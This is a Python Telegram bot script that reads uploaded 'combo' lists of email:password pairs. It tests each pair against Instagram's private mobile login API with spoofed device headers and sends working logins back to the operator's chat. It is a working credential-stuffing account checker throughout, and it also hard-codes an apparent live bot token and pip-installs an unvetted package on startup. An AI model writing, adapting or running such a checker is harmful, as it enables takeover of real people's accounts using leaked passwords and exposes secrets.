import os
os.system('pip install OneClick') 
os.system('pip install sys')
os.system('pip install requests')
os.system('pip install telebot')
import requests
import telebot
from telebot import types
import sys
import uuid
from user_agent import generate_user_agent
from OneClick import *

Hunter = Hunter

token=('6763919459:AAGFnROxEuZq4OsOviqAO_mq-DLts0w3bRA')
bot = telebot.TeleBot(token, parse_mode="HTML")
print('روح على بوتك اضغط [ /start ] ')

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    os._exit(0)

@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(message, "<strong>Send the Combo TXT File \n ارسل ملف الكومبو</strong>")
     
@bot.message_handler(content_types=["document"])
def main(message):
    hit = 0
    dd = 0
    koko = bot.reply_to(message, "CHECKING STARTED BY MAHOS ✅...⌛").message_id
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open("combo.txt", "wb") as w:
        w.write(ee)
    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
            for line in lino:
                try:
                    if ":" in line:
                        psw = line.split(":")[1].strip()
                        email = line.split(":")[0].strip()
                    elif "|" in line:
                        psw = line.split("|")[1].strip()
                        email = line.split("|")[0].strip()
                    else:
                        print('Invalid ID or password')
                        continue
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    butten3 = types.InlineKeyboardButton(
                        f"• HITS IG ✅ ➜ [ {hit} ] •", callback_data='x')
                    butten4 = types.InlineKeyboardButton(
                        f"•  BAD ❌ ➜ [ {dd} ] •", callback_data='x')
                    butten5 = types.InlineKeyboardButton(
                        f"• CHEAK  ➜ [ {email} | {psw} ] •", callback_data='x')
                    butten1 = types.InlineKeyboardButton(
                        f"• 𝗧𝗢𝗧𝗔𝗟  ➜ [ {total} ] •", callback_data='x')
                    stop = types.InlineKeyboardButton(
                        f"[ 𝐒𝐓𝐎𝐏 ]", callback_data='stop')
                    mes.add(butten3, butten4, butten5, butten1, stop)
                    bot.edit_message_text(chat_id=message.chat.id, message_id=koko, text='''Waiting For Hit BY ➜ @maho_s9 ''', reply_markup=mes)

                    url = 'https://i.instagram.com/api/v1/accounts/login/'
                    headers = {
                        'User-Agent': str(Hunter.Services()),
                        'Accept': '*/*',
                        'Cookie': 'missing',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US',
                        'X-IG-Capabilities': '3brTvw==',
                        'X-IG-Connection-Type': 'WIFI',
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Host': 'i.instagram.com'
                    }
                    data = {
                        'uuid': str(uuid.uuid4()), 
                        'password': psw,
                        'username': email,
                        'device_id': "android-" + str(uuid.uuid4()),
                        'from_reg': 'false',
                        '_csrftoken': 'missing',
                        'login_attempt_countn': '0'
                    }
                    req = requests.post(url, headers=headers, data=data).json()
                    
                    msg = f'''
☆ HI NEW HIT 
☆Email : {email}
☆Password : {psw}
☆BY : @maho_s9
                        '''
                    if 'logged_in_user' in req:
                        hit += 1                    
                        print(msg)
                        bot.reply_to(message, msg)
                    elif 'The username you entered' in req or 'The password you entered is incorrect.' in req:
                        dd += 1
                        print('bad')
                    else:
                        dd += 1
                        print('bad')
                except Exception as e:
                    print(e)
    except Exception as e:
        print(e)

while True:
    try:
        bot.infinity_polling()
    except Exception as e:
        print(e)